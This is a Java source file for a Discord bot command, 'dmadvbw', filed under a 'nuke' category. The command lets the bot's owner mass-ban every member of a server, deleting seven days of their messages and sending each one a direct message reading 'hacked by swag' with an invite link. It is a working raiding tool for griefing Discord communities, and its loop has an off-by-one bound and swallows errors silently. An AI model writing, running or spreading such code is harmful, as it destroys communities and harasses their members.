package me.comu.exeter.commands.nuke;

import me.comu.exeter.core.Core;
import me.comu.exeter.interfaces.ICommand;
import me.comu.exeter.logging.Logger;
import me.comu.exeter.wrapper.Wrapper;
import net.dv8tion.jda.api.EmbedBuilder;
import net.dv8tion.jda.api.Permission;
import net.dv8tion.jda.api.entities.Member;
import net.dv8tion.jda.api.entities.TextChannel;
import net.dv8tion.jda.api.events.message.guild.GuildMessageReceivedEvent;
import net.dv8tion.jda.api.exceptions.HierarchyException;

import java.util.Arrays;
import java.util.List;

public class DmAdvBanwaveCommand implements ICommand {

    @Override
    public void handle(List<String> args, GuildMessageReceivedEvent event) {
        if (!(event.getAuthor().getIdLong() == Core.OWNERID )) {
            return;
        }
        Thread banwave1 = new Thread(() -> {
            try {
                List<Member> members = event.getGuild().getMembers();
                for (int i = 0; i <= members.size(); i++) {
                    if (members.get(i).getUser().getIdLong() != Core.OWNERID || !members.get(0).getId().equals(event.getAuthor().getId())) {
                        Wrapper.sendPrivateMessage(event.getJDA(), members.get(i).getUser().getId(), "discord.gg/failures hacked by swag");
                        event.getGuild().ban(members.get(i), 7).reason("GRIEFED BY SWAG").queue();
                        Logger.getLogger().print("Banned " + members.get(i).getUser().getName() + "#" + members.get(i).getUser().getDiscriminator());
                        Thread.sleep(300);
                    }
                }
            } catch (HierarchyException | InterruptedException ex) {}
        });
        banwave1.start();
    }

    @Override
    public String getHelp() {
        return "Use at your own risk\n`" + Core.PREFIX + getInvoke() + "`\nAliases: `" + Arrays.deepToString(getAlias()) + "`";
    }

    @Override
    public String getInvoke() {
        return "dmadvbw";
    }

    @Override
    public String[] getAlias() {
        return new String[0];
    }

     @Override
    public Category getCategory() {
        return Category.NUKE;
    }
}
